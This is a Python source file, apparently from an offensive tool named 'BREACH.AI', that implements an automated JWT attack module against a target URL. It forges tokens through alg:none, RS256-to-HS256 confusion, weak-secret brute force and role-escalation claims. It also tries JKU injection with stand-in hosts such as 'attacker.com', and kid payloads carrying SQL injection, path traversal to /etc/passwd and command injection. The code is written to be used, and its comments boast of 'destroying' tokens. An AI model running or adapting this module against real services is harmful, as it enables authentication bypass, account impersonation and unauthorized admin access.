"""
BREACH.AI - JWT Obliterator

The most comprehensive JWT attack module in existence.
We don't just test JWTs - we DESTROY them.

Attack Categories:
1. Algorithm Confusion - Force alg:none, RS256->HS256
2. Key Attacks - Brute force, key injection, JWK abuse
3. Claim Manipulation - Role escalation, user impersonation
4. Token Forging - Create valid tokens from nothing
5. Signature Bypass - Every known bypass technique
"""

import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass
from typing import Optional

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.http import HTTPClient
from backend.breach.utils.logger import logger


@dataclass
class JWTToken:
    """Parsed JWT token."""
    raw: str
    header: dict
    payload: dict
    signature: bytes

    @classmethod
    def parse(cls, token: str) -> Optional["JWTToken"]:
        """Parse a JWT token."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # Decode header and payload
            header = json.loads(cls._b64_decode(parts[0]))
            payload = json.loads(cls._b64_decode(parts[1]))
            signature = cls._b64_decode(parts[2])

            return cls(
                raw=token,
                header=header,
                payload=payload,
                signature=signature
            )
        except Exception:
            return None

    @staticmethod
    def _b64_decode(data: str) -> bytes:
        """Base64 URL decode with padding fix."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def _b64_encode(data: bytes) -> str:
        """Base64 URL encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def forge(self, new_header: dict = None, new_payload: dict = None, key: bytes = b'') -> str:
        """Forge a new JWT with modified claims."""
        header = new_header or self.header
        payload = new_payload or self.payload

        header_b64 = self._b64_encode(json.dumps(header).encode())
        payload_b64 = self._b64_encode(json.dumps(payload).encode())

        signing_input = f"{header_b64}.{payload_b64}"

        alg = header.get('alg', 'none').upper()

        if alg == 'NONE':
            signature = ''
        elif alg == 'HS256':
            signature = self._b64_encode(
                hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
            )
        elif alg == 'HS384':
            signature = self._b64_encode(
                hmac.new(key, signing_input.encode(), hashlib.sha384).digest()
            )
        elif alg == 'HS512':
            signature = self._b64_encode(
                hmac.new(key, signing_input.encode(), hashlib.sha512).digest()
            )
        else:
            signature = self._b64_encode(self.signature)

        return f"{header_b64}.{payload_b64}.{signature}"


class JWTObliterator(BaseAttack):
    """
    JWT OBLITERATOR - Comprehensive JWT destruction.

    This module implements EVERY known JWT attack technique.
    If there's a JWT vulnerability, we WILL find it.
    """

    name = "JWT Obliterator"
    attack_type = "jwt_attack"
    description = "Comprehensive JWT vulnerability exploitation"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 287

    # Common weak secrets for brute force
    WEAK_SECRETS = [
        # Super common
        "secret", "password", "123456", "admin", "key", "private",
        "jwt_secret", "jwt-secret", "jwtSecret", "JWT_SECRET",
        "supersecret", "mysecret", "s3cr3t", "changeme",

        # Framework defaults
        "your-256-bit-secret", "your-secret-key", "your_secret_key",
        "secret_key", "SECRET_KEY", "secretkey", "secretKey",
        "jwt_secret_key", "JWT_SECRET_KEY", "application-secret",

        # Technology specific
        "rails_secret", "django-secret", "laravel_secret",
        "node_secret", "express_secret", "flask_secret",

        # Common patterns
        "test", "testing", "development", "dev", "prod",
        "secret123", "password123", "admin123", "key123",

        # Empty and null
        "", "null", "undefined", "none", "nil",

        # Common files content
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
    ]

    # Role escalation payloads
    ROLE_ESCALATIONS = [
        {"role": "admin"},
        {"role": "administrator"},
        {"admin": True},
        {"is_admin": True},
        {"isAdmin": True},
        {"roles": ["admin"]},
        {"roles": ["administrator", "superuser"]},
        {"permissions": ["*"]},
        {"group": "admin"},
        {"groups": ["admin", "superadmin"]},
        {"privilege": "admin"},
        {"access_level": "admin"},
        {"user_type": "admin"},
        {"type": "admin"},
    ]

    def get_payloads(self) -> list[str]:
        return self.WEAK_SECRETS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if JWT is in use."""
        response = await self.http_client.get(url)

        # Look for JWT anywhere
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

        # Check response body
        if re.search(jwt_pattern, response.body):
            return True

        # Check headers
        for header_value in response.headers.values():
            if re.search(jwt_pattern, str(header_value)):
                return True

        # Check cookies
        for cookie_value in response.cookies.values():
            if re.search(jwt_pattern, str(cookie_value)):
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive JWT attacks."""
        result = self._create_result(False, url, parameter)

        # Extract JWT from target
        jwt_token = await self._extract_jwt(url)
        if not jwt_token:
            result.details = "No JWT token found"
            return result

        logger.info(f"[JWT] Found token: {jwt_token.raw[:50]}...")
        logger.info(f"[JWT] Algorithm: {jwt_token.header.get('alg')}")
        logger.info(f"[JWT] Claims: {list(jwt_token.payload.keys())}")

        # Attack 1: Algorithm None Attack
        none_result = await self._attack_algorithm_none(url, jwt_token)
        if none_result:
            result.success = True
            result.payload = none_result["token"]
            result.details = "CRITICAL: Algorithm 'none' accepted - can forge ANY token!"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "jwt_alg_none",
                "Server accepts algorithm 'none' - complete JWT bypass",
                none_result["token"]
            )
            return result

        # Attack 2: Algorithm Confusion (RS256 -> HS256)
        confusion_result = await self._attack_algorithm_confusion(url, jwt_token)
        if confusion_result:
            result.success = True
            result.payload = confusion_result["token"]
            result.details = "CRITICAL: Algorithm confusion - RS256 verified as HS256 with public key!"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "jwt_alg_confusion",
                "RS256 token accepted when signed as HS256 with public key",
                confusion_result["token"]
            )
            return result

        # Attack 3: Weak Secret Brute Force
        weak_secret = await self._attack_weak_secret(url, jwt_token)
        if weak_secret:
            result.success = True
            result.payload = weak_secret["secret"]
            result.details = f"CRITICAL: JWT secret cracked: '{weak_secret['secret']}'"
            result.access_gained = AccessLevel.ADMIN
            result.data_sample = weak_secret["forged_token"]
            result.add_evidence(
                "jwt_weak_secret",
                f"JWT secret is weak and crackable",
                f"Secret: {weak_secret['secret']}"
            )
            return result

        # Attack 4: Claim Manipulation (even without secret)
        claim_result = await self._attack_claim_manipulation(url, jwt_token)
        if claim_result:
            result.success = True
            result.payload = claim_result["token"]
            result.details = f"Role escalation via claim manipulation: {claim_result['claim']}"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "jwt_claim_manipulation",
                "JWT claims can be manipulated for privilege escalation",
                claim_result["token"]
            )
            return result

        # Attack 5: JKU/X5U Injection
        jku_result = await self._attack_jku_injection(url, jwt_token)
        if jku_result:
            result.success = True
            result.payload = jku_result["token"]
            result.details = "JKU/X5U injection - can provide our own signing key!"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "jwt_jku_injection",
                "JKU header injection allows custom key specification",
                jku_result["details"]
            )
            return result

        # Attack 6: KID Injection (SQL/Path Traversal)
        kid_result = await self._attack_kid_injection(url, jwt_token)
        if kid_result:
            result.success = True
            result.payload = kid_result["token"]
            result.details = f"KID injection: {kid_result['type']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "jwt_kid_injection",
                "Key ID (kid) parameter is injectable",
                kid_result["payload"]
            )
            return result

        # Attack 7: Expired Token Acceptance
        expired_result = await self._attack_expired_token(url, jwt_token)
        if expired_result:
            result.success = True
            result.payload = jwt_token.raw
            result.details = "Server accepts expired JWT tokens!"
            result.add_evidence(
                "jwt_expired_accepted",
                "Token expiration not enforced",
                f"Token expired at: {expired_result['exp']}"
            )
            return result

        # Attack 8: Signature Not Verified
        sig_result = await self._attack_signature_not_verified(url, jwt_token)
        if sig_result:
            result.success = True
            result.payload = sig_result["token"]
            result.details = "CRITICAL: JWT signature is NOT verified!"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "jwt_sig_not_verified",
                "Server accepts tokens with invalid signatures",
                sig_result["token"]
            )
            return result

        return result

    async def _extract_jwt(self, url: str) -> Optional[JWTToken]:
        """Extract JWT from the target."""
        response = await self.http_client.get(url)
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

        # Check response body
        match = re.search(jwt_pattern, response.body)
        if match:
            return JWTToken.parse(match.group(0))

        # Check Authorization header in stored cookies/headers
        for value in response.cookies.values():
            match = re.search(jwt_pattern, str(value))
            if match:
                return JWTToken.parse(match.group(0))

        return None

    async def _attack_algorithm_none(self, url: str, token: JWTToken) -> Optional[dict]:
        """Test algorithm 'none' vulnerability."""
        logger.debug("[JWT] Testing algorithm 'none'...")

        # Variations of 'none'
        none_variants = ['none', 'None', 'NONE', 'nOnE']

        for alg in none_variants:
            forged = token.forge(
                new_header={**token.header, 'alg': alg},
                new_payload=token.payload
            )

            # Also try without signature
            forged_no_sig = forged.rsplit('.', 1)[0] + '.'

            for test_token in [forged, forged_no_sig]:
                if await self._test_token(url, test_token):
                    return {"token": test_token, "variant": alg}

        return None

    async def _attack_algorithm_confusion(self, url: str, token: JWTToken) -> Optional[dict]:
        """Test RS256 to HS256 algorithm confusion."""
        if token.header.get('alg', '').upper() not in ['RS256', 'RS384', 'RS512']:
            return None

        logger.debug("[JWT] Testing algorithm confusion (RS256 -> HS256)...")

        # Try to find public key
        public_key = await self._find_public_key(url)
        if not public_key:
            return None

        # Sign with public key as HS256 secret
        hs_alg = 'HS' + token.header['alg'][2:]  # RS256 -> HS256
        forged = token.forge(
            new_header={**token.header, 'alg': hs_alg},
            new_payload=token.payload,
            key=public_key.encode()
        )

        if await self._test_token(url, forged):
            return {"token": forged, "key": public_key[:100]}

        return None

    async def _find_public_key(self, url: str) -> Optional[str]:
        """Try to find public key from common locations."""
        key_endpoints = [
            '/.well-known/jwks.json',
            '/jwks.json',
            '/api/jwks',
            '/.well-known/openid-configuration',
            '/oauth/jwks',
            '/auth/keys',
            '/.well-known/keys',
            '/api/v1/keys',
        ]

        for endpoint in key_endpoints:
            try:
                # Build absolute URL
                from urllib.parse import urljoin
                key_url = urljoin(url, endpoint)
                response = await self.http_client.get(key_url)

                if response.status_code == 200:
                    # Try to extract public key
                    try:
                        data = json.loads(response.body)
                        if 'keys' in data:
                            # JWKS format
                            for key in data['keys']:
                                if 'n' in key and 'e' in key:
                                    # RSA public key components
                                    return json.dumps(key)
                        return response.body
                    except json.JSONDecodeError:
                        if 'BEGIN PUBLIC KEY' in response.body:
                            return response.body
            except Exception:
                continue

        return None

    async def _attack_weak_secret(self, url: str, token: JWTToken) -> Optional[dict]:
        """Brute force weak secrets."""
        if token.header.get('alg', '').upper() not in ['HS256', 'HS384', 'HS512']:
            return None

        logger.debug(f"[JWT] Brute forcing {len(self.WEAK_SECRETS)} common secrets...")

        for secret in self.WEAK_SECRETS:
            # Forge token with this secret
            forged = token.forge(key=secret.encode())

            # If signature matches original, we found the secret!
            if forged == token.raw:
                logger.info(f"[JWT] SECRET FOUND: {secret}")

                # Now forge an admin token
                admin_payload = {**token.payload}
                for escalation in self.ROLE_ESCALATIONS:
                    admin_payload.update(escalation)
                    break

                admin_token = token.forge(new_payload=admin_payload, key=secret.encode())

                return {
                    "secret": secret,
                    "forged_token": admin_token
                }

        return None

    async def _attack_claim_manipulation(self, url: str, token: JWTToken) -> Optional[dict]:
        """Try claim manipulation for privilege escalation."""
        logger.debug("[JWT] Testing claim manipulation...")

        original_payload = token.payload.copy()

        for escalation in self.ROLE_ESCALATIONS:
            modified_payload = {**original_payload, **escalation}

            # Try with algorithm none (might work)
            forged = token.forge(
                new_header={**token.header, 'alg': 'none'},
                new_payload=modified_payload
            )

            if await self._test_token_for_admin(url, forged):
                return {
                    "token": forged,
                    "claim": str(escalation)
                }

        return None

    async def _attack_jku_injection(self, url: str, token: JWTToken) -> Optional[dict]:
        """Test JKU/X5U header injection."""
        logger.debug("[JWT] Testing JKU/X5U injection...")

        # We'd need an external server to host our key
        # For detection, we can test if the header is processed

        test_urls = [
            "http://attacker.com/jwks.json",
            "https://evil.com/.well-known/jwks.json",
            "http://localhost/jwks.json",
        ]

        for jku_url in test_urls:
            # Try jku header
            forged = token.forge(
                new_header={**token.header, 'jku': jku_url},
                new_payload=token.payload
            )

            response = await self._send_token(url, forged)

            # If server tries to fetch the URL, it might timeout or error differently
            # This is a detection heuristic
            if response and "timeout" in response.body.lower():
                return {
                    "token": forged,
                    "details": f"Server attempted to fetch JKU from {jku_url}"
                }

        return None

    async def _attack_kid_injection(self, url: str, token: JWTToken) -> Optional[dict]:
        """Test Key ID (kid) injection vulnerabilities."""
        logger.debug("[JWT] Testing kid injection...")

        kid_payloads = [
            # SQL Injection
            ("sqli", "' OR '1'='1"),
            ("sqli", "1' OR '1'='1'--"),
            ("sqli", "'; DROP TABLE keys;--"),

            # Path traversal to known files
            ("path_traversal", "../../../../../../dev/null"),
            ("path_traversal", "../../../../../../../etc/passwd"),
            ("path_traversal", "/dev/null"),

            # Command injection
            ("cmd_injection", "key.pem; ls"),
            ("cmd_injection", "| cat /etc/passwd"),

            # Point to empty/predictable file
            ("empty_file", "/dev/null"),
            ("empty_file", "/proc/sys/kernel/randomize_va_space"),
        ]

        for injection_type, kid in kid_payloads:
            forged = token.forge(
                new_header={**token.header, 'kid': kid},
                new_payload=token.payload
            )

            response = await self._send_token(url, forged)

            if response:
                # Check for signs of injection success
                if injection_type == "sqli" and ("error" in response.body.lower() or "sql" in response.body.lower()):
                    return {"token": forged, "type": "SQL Injection in kid", "payload": kid}

                if injection_type == "path_traversal" and response.status_code == 200:
                    # Might have read a file as the key
                    return {"token": forged, "type": "Path Traversal in kid", "payload": kid}

        return None

    async def _attack_expired_token(self, url: str, token: JWTToken) -> Optional[dict]:
        """Check if expired tokens are accepted."""
        exp = token.payload.get('exp')

        if not exp:
            return None

        current_time = int(time.time())

        if exp < current_time:
            # Token is already expired
            if await self._test_token(url, token.raw):
                return {"exp": exp, "current": current_time}

        return None

    async def _attack_signature_not_verified(self, url: str, token: JWTToken) -> Optional[dict]:
        """Test if signature is actually verified."""
        logger.debug("[JWT] Testing if signature is verified...")

        # Corrupt the signature
        parts = token.raw.split('.')
        corrupted_sig = 'A' * len(parts[2]) if parts[2] else 'AAAA'
        corrupted_token = f"{parts[0]}.{parts[1]}.{corrupted_sig}"

        if await self._test_token(url, corrupted_token):
            return {"token": corrupted_token}

        # Try empty signature
        empty_sig_token = f"{parts[0]}.{parts[1]}."
        if await self._test_token(url, empty_sig_token):
            return {"token": empty_sig_token}

        return None

    async def _test_token(self, url: str, token: str) -> bool:
        """Test if a JWT token is accepted."""
        response = await self._send_token(url, token)

        if not response:
            return False

        # Check for acceptance (not 401/403)
        if response.status_code in [200, 201, 302]:
            return True

        # Check for positive indicators
        positive = ["welcome", "dashboard", "profile", "success"]
        if any(p in response.body.lower() for p in positive):
            return True

        return False

    async def _test_token_for_admin(self, url: str, token: str) -> bool:
        """Test if token grants admin access."""
        response = await self._send_token(url, token)

        if not response:
            return False

        # Look for admin-specific content
        admin_indicators = ["admin", "administrator", "superuser", "manage", "settings"]
        return any(ind in response.body.lower() for ind in admin_indicators)

    async def _send_token(self, url: str, token: str):
        """Send request with JWT token."""
        # Try Authorization header
        headers = {"Authorization": f"Bearer {token}"}

        try:
            return await self.http_client.get(url, headers=headers)
        except Exception:
            return None
